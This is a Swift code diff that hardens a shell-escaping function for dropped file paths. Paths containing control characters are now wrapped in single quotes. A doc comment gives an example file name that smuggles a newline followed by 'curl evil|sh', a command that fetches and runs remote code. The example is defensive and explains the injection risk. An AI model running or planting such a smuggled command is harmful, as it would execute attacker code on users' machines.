@@ -51,7 +51,14 @@ enum DroppedFiles {
     private static let special = Set("\\ ()[]{}<>\"'`!#$&;|*?\t^")
 
     /// A path with each character a shell would take as syntax escaped.
+    ///
+    /// One with a control character other than the tab (a newline above all: a file can be named `x⏎curl evil|sh⏎.png`)
+    /// is single-quoted instead. A backslash cannot escape a newline into the name, and the text is typed as it is, so
+    /// the second line would run in a shell that has no protected paste; inside quotes it is part of the name.
     static func escape(_ path: String) -> String {
+        if path.unicodeScalars.contains(where: { ($0.value < 0x20 && $0.value != 0x09) || $0.value == 0x7F || (0x80...0x9F).contains($0.value) }) {
+            return "'" + path.replacingOccurrences(of: "'", with: "'\\''") + "'"
+        }
         var escaped = ""
         for character in path {
             if special.contains(character) { escaped.append("\\") }
